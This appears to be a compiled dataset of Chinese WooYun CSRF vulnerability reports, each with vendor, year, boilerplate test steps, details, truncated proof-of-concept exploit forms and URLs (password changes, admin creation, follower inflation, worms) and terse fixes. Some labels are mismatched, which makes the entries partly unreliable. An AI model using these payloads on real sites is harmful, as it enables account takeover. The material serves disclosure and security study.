**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 进入个人信息，修改个人信息，抓包查看：可以看到无不可预测参数，可伪造csrf恶意链接，主要代码如下：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("sex=0&marry=1&birth=2015-9-2&birthyear=2015&birthmonth=9&birthday=2&blood=B&birthprovince=%E5%8C%97%E4%BA%AC&birthcity=%E4%B8%9C%E5%9F%8E&

**POC**: 同上

**绕过**: 直接利用

**修复**: 验证referer加token
---

---
### [wooyun-2015-0107723] ESPCMS后台CSRF修改管理密码
**厂商**: 易思ESPCMS企业网站管理系统 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改管理员密码没有验证原密码 我也是醉了 抓包没有token值验证 构造表单试试？ok啊 可以修改啊表单构造好了，但是修改好了之后随便不会提示修改了密码，但是会自动跳转到后台，这样就会被管理员发现或者产生怀疑了~~肿么破？？？我们利用回旋镖~我们新建一个html，代码如下<html><table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="color:#FFFFFF;z-index: 6000;vertical-align:top;"><h1>乌云测试</h1></td></tr></tbody></table><<meta http-equi

**POC**: 修改管理员密码没有验证原密码 我也是醉了 抓包没有token值验证 构造表单试试？ok啊 可以修改啊表单构造好了，但是修改好了之后随便不会提示修改了密码，但是会自动跳转到后台，这样就会被管理员发现或者产生怀疑了~~肿么破？？？我们利用回旋镖~我们新建一个html，代码如下<html><table style="left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;"><tbody><tr><td style="colo

**绕过**: 直接利用

**修复**: 你懂的修改时需要验证原密码即可
---

---
### [wooyun-2016-0180311] 某社交平台论坛CSRF打包及危害说明（多个子论坛通用）
**厂商**: 某社交平台 | **年份**: 2016 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此漏洞涉及到的某社交平台子论坛包括但不限于以下站点星座 https://example.com/[已脱敏]     b4201dfd数码 https://example.com/[已脱敏]      b4201dfd百味 https://example.com/[已脱敏]      b4201dfd生活 https://example.com/[已脱敏]      b4201dfd女性 https://example.com/[已脱敏]   4788b761历史 https://example.com/[已脱敏]   b4201dfd军事 https://example.com/[已脱敏]  b4201dfd体育 https://example.com/[已脱敏]      b4201dfd亲子 http://

**POC**: 以亲子论坛为例，时间有限只测试了四个位置，估计整个论坛都没有做csrf的防护，其他重要位置还请自行检测^_^1 修改用户信息<form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="formhash" value="aec0506d" /><input type="hidden" name="nicknamenew" value="GAY21888" /><input type="hidden" name="gend

**绕过**: 直接利用

**修复**: 你们更专业！
---

---
### [wooyun-2014-080964] 某社交平台某社交平台某处小功能存在CSRF漏洞（可修改用户某社交平台某元素）
**厂商**: 某社交平台某社交平台 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 新版某社交平台出了一个小功能（类似某社交空间一样），就是可以设置背景音乐。通过抓包后得知背景音乐某首歌的URL为：https://example.com/[已脱敏] 后面token我理解为都是这首歌的。。直接点击上面的URL就可以看到在你个人页面左边有个背景音乐了：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-035496] 某搜索引擎贴吧某处csrf漏洞可自动关注贴吧（可刷贴吧会员数）
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不知道
---

---
### [wooyun-2013-026182] 某社交平台csrf刷粉丝漏洞
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某社交平台的HK站点：https://example.com/[已脱敏]"t.某域名.com"站点同步，添加一个收听是GET请求，哈哈，so直接构造下面的请求；https://example.com/[已脱敏]

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2015-0124904] 波奇网 csrf一枚，随意更改他人收货地址
**厂商**: 波奇网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登录账户A，修改其收货地址，并抓包：查看其收货地址请求为post请求，同上不存在不可预测的参数，猜测存在csrf于是构造htmlxmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("addrId=737093&name=woooo&province=13&city=1302&street=gktjgj&mobile=13200000000&phone=&zipCode=&isDefault=on")访问链接csrfboq.html刷新收货地址以看到收货

**POC**: 同上

**绕过**: 直接利用

**修复**: token验证refer
---

---
### [wooyun-2015-0100669] phpmywind最新5.2版本存在CSRF添加管理员漏洞
**厂商**: phpmywind.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 嗯哼？在后台添加管理员时候开启burp截取下包看看是怎么样的。POST /phpmywind/admin/admin_save.php HTTP/1.1Host: [IP已脱敏]User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://[IP已脱敏] 33b5b_lastpos=ot

**POC**: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><title>OWASP CRSFTester Demonstration</title></head><body onload="javascript:fireForms()"><script language="JavaScript">var pauses = new Array( "62","47" );function pausecomp(millis){var date = new Date();var curDate = null;d

**绕过**: 直接利用

**修复**: 嗯哼？加个token限制吧~
---

---
### [wooyun-2015-0165308] 某视频网站某处csrf漏洞
**厂商**: 某视频网站.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此漏洞可以针对up主，关闭下列三项弹幕权限，使其发稿视频没有弹幕！csrf位置在用户中心-->过滤管理中，https://example.com/[已脱敏]

**POC**: poc<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>CSRF/exploit--某视频网站</title></head><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="format" value="json" /><input type="hidden" name="a

**绕过**: 直接利用

**修复**: 加上token;验证reffer
---

---
### [wooyun-2014-051267] 某社交圈子跟随CSRF刷粉和用户邮箱泄露
**厂商**: 某门户网站 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 见详细

**绕过**: 直接利用

**修复**: 跟随请求验证referer或token，最好还是不要用用户的邮箱进行加密传输吧，换成用户id
---

---
### [wooyun-2013-040453] 某社交平台某处csrf漏洞
**厂商**: 某门户网站 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: post：https://example.com/[已脱敏]]content=csrf

**POC**: 如上

**绕过**: 直接利用

**修复**: 你们懂滴
---

---
### [wooyun-2012-05709] 某社交平台CSRF漏洞--可造成蠕虫
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: PS：貌似老早就被人发到wooyun上了，难道我穿越了…………1、登陆https://example.com/[已脱敏]

**POC**: <html><head><title>163 weibo csrf test</title><script type="text/javascript">//follow mefunction addF(){document.getElementById("addF").submit();}//add twitterfunction addT(){document.getElementById("addT").submit();}</script></head><body onload="addF();addT();"><form target="addFF" id="addF" method

**绕过**: 直接利用

**修复**: 检查referer
---

---
### [wooyun-2013-020158] 某社交平台惊现刷粉丝漏洞，某社交平台控们有福了
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天偶然发现某互联网公司出了个iweibo，好奇的看了下，于是有了下文！1）使用某社交平台帐号登录，随便找了个未收听的人点击收听并抓包，一看我就笑了，直接就是GET；2）在iweibo上看了看，数据完全都是同t.某域名.com上一致，也就是说两个站点数据是同步的；那么如果在iweibo上收听了某个人，是不是t.某域名.com上也就会收听这个人，哈哈，这是可以刷粉丝了么？3）好吧，我是来自wooyun的白帽子，那就给wooyun刷点粉丝吧，将下列链接通过t.某域名.com发布获取到短地址（达到更好隐藏的目的）；https://example.com/[已脱敏]

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 还是POST吧
---

---
### [wooyun-2015-0112506] csrf添加管理员
**厂商**: phpshe.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 版本:phpshe1.3最新版。其他版本没有测试，请自查后台管理列表，添加管理员表单没有token导致csrf

**POC**: 不想录视频了。我提供代码你们自己测下。<form name="form1" action="http://[IP已脱敏] method="post"><input type="hidden" value="csrftest" name="info[admin_name]"></input><input type="hidden" value="csrftest" name="admin_pw"></input><input type="hidden"name="pesubmit" value="提 交" cla

**绕过**: 直接利用

**修复**: 加上token
---

---
### [wooyun-2013-026768] 某社交平台某社交平台某处csrf可构造蠕虫
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.问题所在位置如下：2.写上内容点击发布并抓包得到数据；POST /event/emergencyRoom/send/process HTTP/1.1Host: tw.weibo.comUser-Agent:Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: https://example.com/[已脱敏] 61Cookie:Connection: keep-alivePragma: 

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 你们专业
---

---
### [wooyun-2015-0101573] 花瓣网全站点多处功能设计缺陷导致跨站请求伪造(CSRF)#2(绕过X-CSRF-Token限制)
**厂商**: huaban.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 花瓣网全站点多处功能设计缺陷导致跨站请求伪造(CSRF)#2(绕过X-CSRF-Token限制)。接口：https://example.com/[已脱敏]"err":403,"msg":"邮箱地址不存在","_csrf":"*****"}此处页面返回X-CSRF-Token，全站关于CSRF的防御将会因此全部无效。

**POC**: 顺便附带poc代码：<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>CSRF  POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="email" value="*********@某域名.com"/></form><script>document.forms[0].submit();</script>

**绕过**: 过滤绕过

**修复**: 相关接口严禁返回X-CSRF-Token.
---

---
### [wooyun-2014-086159] PHP云刷积分刷粉丝csrf两处
**厂商**: php云人才系统 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一。文件位置：https://example.com/[已脱敏] sava_ajaxresume_action(){$data['uid']=(int)$_POST['uid'];//邀请面试人的uid$data['title']='面试邀请';$data['content']=iconv("utf-8","gbk",$_POST['content']);//邀请内容$data['fid']=$this->uid;$data['datetime']=time();$info['content']=$data['content'];$info['jobname']=iconv("utf-8","gbk",$_POST['jobname']);//邀请面试的职位$info['use

**POC**: 一。1.登录公司账户查看邀请面试的人才是0个目前公司积分19764分2.退出登录，自己构造包且在无用户登录状态3.提交包目前公司积分19752分，少12积分4.登录公司账号成功，你想去什么公司可以自己构造给自己发面试邀请啊二。1.post内容只需两个参数，关注人uid，被关注人id。这两个参数都是注册时自增的值。2.用户33未关注113.发post包。33关注11登录查看。已关注4.再次发   33取消关注11登录查看 。取消

**绕过**: 直接利用

**修复**: 参数太简单了，我看管理员后台有pytoken，前台也可以加上
---

---
### [wooyun-2015-0120438] 壹心理漏某处csrf
**厂商**: xinli001.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 保存资料处没有任何验证。请求数据就不贴上了，构造的POC代码如下：<html><head><title>CSRF POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="nickname" value="wooyunorg"><input type="hidden" name="gender" value="male"><input type="hidden" name="birthday" value="2014-2

**绕过**: 直接利用

**修复**: 加上token验证之类的。
---

---
### [wooyun-2014-055111] 某门户网站一处csrf漏洞
**厂商**: 某门户网站 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在VIP读书哪里可以get删除章节的url。。。抓包删除“第一卷”- -

**POC**: 在VIP读书哪里可以get删除章节的url。。。抓包删除“第一卷”- -

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2011-01447] 某邮箱服务设置转发CSRF漏洞
**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 只有SID的token,但sid是附在URL中的,如果向受害者邮箱发送带有一封有位于自己服务器上的图片的信件,可以利用referer来收集sid,进而进行进一步的攻击.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 在邮箱设置出另加Token
---

---
### [wooyun-2015-0116647] 果壳网两性社区绕过token继续csrf
**厂商**: 果壳传媒 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>CSRF  POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="nickname" value="&#x5C0F;&#x4E01;&#x4E01;&#x7206;&#x4E86;"/><!--这是utf-8编码，昵称处--><input type="hidde

**绕过**: 直接利用

**修复**: 1：token加上去要判断啊。。用户去掉你就给去啊。。
---

---
### [wooyun-2015-0126842] 奥康国际网站任意更改他人收货地址（CSRF漏洞）
**厂商**: aokang.cn | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看到收货地址，立即抓包看。没看到验证啊什么的。我们来构造poc我们来访问OK  成功

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 增加验证就可以了
---

---
### [wooyun-2015-0104291] 网趣商城系统两处CSRF可添加管理，修改用户密码
**厂商**: 网趣商城 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接下载源码测试的  最新 9.3两处CSRF分别可以后台添加管理修改用户密码

**POC**: 修改密码。抓包 发现没有token构造表单<html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="http://localhost:58898/saveuserinfo.asp?action=savepass" method="POST"><input type="hidden" name="userpassword" value="wuyun12" /><input type="hidden" name="userpassword2" value="wuyun12" /><input 

**绕过**: 直接利用

**修复**: 加token
---

---
### [wooyun-2013-045965] 115网盘某处flash域安全配置不完善可导致用户隐私泄露(配合圈子某脚本问题,利用率大幅提升)
**厂商**: 广东雨林木风计算机科技有限公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 对于115网盘,上传的swf是可以被存在服务器上直接访问的,存储的域是staticdl.115.com,并且该地址是可以在未登陆下可访问的(这个倒是没什么安全问题,毕竟这个连接也是很长的,而且其他一些网盘也这么设计的)问题是my.115.com下的crossdomain.xml是这样的<allow-access-from domain="*.115.com"/>那么我们上传的文件是可以访问my.115.com下所有资源的..为了提高利用率,这里再说下圈子的flash的一个问题,flash视频在播放的时候并不是自动打开的,而是先有一个图片,点击后播放,但是脚本里对一些常见的网站是自动播放的..是这样放行的:"\\.(youku|56|ku6|kugou|tudou|sina|pptv|qiyi|某互联网公司|xiami|yinyuetai)\\.(com|cn|net)"我们只需在末尾加上.56.c

**POC**: 收货地址获取的代码

**绕过**: 直接利用

**修复**: 给个手机优先购买资格什么的吧..
---

---
### [wooyun-2013-035674] 大连街社区论坛收听处csrf漏洞
**厂商**: 大连街社区 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无聊到处逛，于是发现这个奇葩。收听URL：https://example.com/[已脱敏]

**POC**: 输入地址成功收听：然后成功取消：

**绕过**: 直接利用

**修复**: 鸡肋。
---

---
### [wooyun-2015-0128677] 吉屋网CSRF漏洞
**厂商**: jiwu.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] CSRF PoC - generated by Burp Suite Professional --><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="agent&#46;email" value="wooyun999&#64;163&#46;com" /><input type="hidden" name="agent&#46;districtId" value="22781" /><input type="hidden" name="agent&#46;streetId" value="0" /><input type="hidden" name="agent&#46;

**POC**: 可修改用户邮箱POC<html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="agent&#46;email" value="wooyun999&#64;163&#46;com" /><input type="hidden" name="agent&#46;districtId" value="22781" /><input type="

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-069712] 百姓网csrf删除文章漏洞
**厂商**: 百姓网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 只要知道发布的信息id即可，而id是所有人可见的。只需私信发布者如此链接：https://example.com/[已脱敏]

**POC**: 打开新页面在url栏输入地址，即可

**绕过**: 直接利用

**修复**: 判断referer用post请求
---

---
### [wooyun-2013-043974] 某互联网公司公益评论CSRF某社交平台漏洞
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 登陆状态访问：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 增加token,顺便说一下，我觉得这个站点貌似是不对CSRF设防的，像什么修改收货地址啥的，主要是这个会影响某社交平台，所以拿出来。其他就不报了，乌云同站点同类型漏洞是走小厂商，伤心啊！
---

---
### [wooyun-2013-033610] 某电商平台商城一个csrf商家可以刷关注
**厂商**: 某电商平台商城 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于某电商平台用户数量巨大，且还有第三方商家平台导致任何一个业务问题都可能对用户造成不小 的影响而且某电商平台cookies是保存比较长时间的，那么一个小小的get的csrf可能会让很多用户中招对于某厂商的商品降价后还会有短消息提示，以厂商为例就可以去其他网站或者某社交平台发送csrfhttps://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 该问题因该结合业务去看，不过单纯技术来看也会对用户造成一定影响，很多时候csrf直接在某处以图片img形式触发，影响会有一点
---

---
### [wooyun-2015-0127555] 凯迪网络CSRF漏洞
**厂商**: 凯迪网络 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] ， 导致用户无法删除，增加 且数据乱码，影响账号数据正常是这样的

**POC**: 构造好POC<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="a" value="save" /><input type="hidden" name="delivery&#95;name" value="&#37;u963F&#37;u8428&#37;u8FBE" /><input type="hidden" name="s&#95;province" value="&#37;u5929&#37;u6D25&#37;u5E02" /><i

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2011-03058] SAE CSRF
**厂商**: 某社交平台 | **年份**: 2011 | **类型**: 

**元思考**: 触发信号: 功能测试

**洞察**: 防护不足，开发者信任前端输入

**测试流程**:
1. 识别相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: sae.sina.com.cn/?m=coopmng&a=invite&app_id=wooyun&to_invite=someone@somedomain.com&role=other&priv[]=priv_deploy&inviteWords=hi,dude.在wooyun的插入图片试试这个链接，或许。

**POC**: <img src="sae.sina.com.cn/?m=coopmng&a=invite&app_id=wooyun&to_invite=someone@somedomain.com&role=other&priv[]=priv_deploy&inviteWords=hi,dude." />

**绕过**: 直接利用

**修复**: 增删改操作需要一个token。
---

---
### [wooyun-2015-0122917] 易果网某站存在sql注射
**厂商**: 易果网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注射点：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 多查查。
---

---
### [wooyun-2012-015221] 某体育社区论坛CSRF‮.
**厂商**: 某体育社区体育网 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-020979] 360网址导航个人导航csrf漏洞
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 个人中心https://example.com/[已脱敏] 乌云https://example.com/[已脱敏] 打开显示succes然后返回个人中心

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 360懂的
---

---
### [wooyun-2013-020652] 某社交平台无限制刷粉丝，可传播
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 访问以下url即可关注此人https://example.com/[已脱敏]

**POC**: 访问以上url直接就关注了https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 1、最好改成POST方法2、如果坚持用GET方法，应该加上随机token
---

---
### [wooyun-2014-068794] 酷我音乐某分站csrf可刷粉丝
**厂商**: 酷我音乐 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 点击关注 抓包 直接get请求啥都没验证

**POC**: kzone.kuwo.cn/mlog/Follow?act=add&referId=149941230关注成功 返回200 失败302

**绕过**: 直接利用

**修复**: 添加验证码
---

---
### [wooyun-2013-022700] thinksns最新版某社交平台某处配置不当可引发大规模蠕虫
**厂商**: ThinkSNS | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首页发某社交平台处未验证token，导致可以通过一个精心构造的表单使用户发一个带有链接的某社交平台，点击链接后的用户又会干相同的事，一传十，十传百，将会引发大规模蠕虫。

**POC**: POC:<html><body><form name="csrf" action="https://example.com/[已脱敏]" method="POST"><input type=text name=body value="你所不知道的关于thinksns的秘密：https://example.com/[已脱敏]"></input><input type=text name=app_name value="public"></input><input type=text na

**绕过**: 直接利用

**修复**: 操作要加上随机的token求20rank,求礼物
---

---
### [wooyun-2013-025472] 某社交平台多处GetCsrf删除消息绑定手机号
**厂商**: 某门户网站 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]  删除私信https://example.com/[已脱敏]  删除系统消息https://example.com/[已脱敏] 绑定手机号

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 农民工不懂怎么修复
---

---
### [wooyun-2015-0129047] 方维某系统一处奇葩漏洞可修改用户密码(demo演示)
**厂商**: fanwe.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: https://example.com/[已脱敏] charset="utf-8"/><title>csrf poc</title></head><body><form action="https://example.com/[已脱敏]" method="pos

**绕过**: 直接利用

**修复**: 高rank，礼物在哪里。
---

---
### [wooyun-2015-0109911] uc某站csrf修改用户信息
**厂商**: UC Mobile | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: <form  target="frame_profile" enctype="multipart/form-data" method="post" action="https://example.com/[已脱敏]"><input type="hidden" name="formhash" value="6a12255c"><table cellspacing="0" cellpadding="0" id="profilelist" class="tfm"><tbody><tr><th>用户名</th><td>assfffg</td

**绕过**: 直接利用

**修复**: token或者判断referer
---

---
### [wooyun-2014-088099] 一封邮件即可控制21cn用户邮箱今后的邮件
**厂商**: 21CN | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 21CN网站邮箱系统存在多个大小漏洞，成功同时利用该几个小漏洞便造成严重问题。漏洞一：对HTML代码过滤不严格，导致可插入特定HTML代码漏洞二：重要操作无TOKEN，而且不验证GET/POST请求导致CSRF攻击代码可参考测试代码

**POC**: 使用任意邮箱给21CN邮箱发送一封邮件用户点击该邮件即可自动创建一条邮件规则，从而劫持用户邮件。

**绕过**: 直接利用

**修复**: 漏洞一：对HTML代码进行较为严格的白名单过滤和输出编码漏洞二：重要操作需要有Token，防止CSRF攻击。
---

---
### [wooyun-2015-0128683] 太平洋汽车网csrf漏洞
**厂商**: 太平洋汽车网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
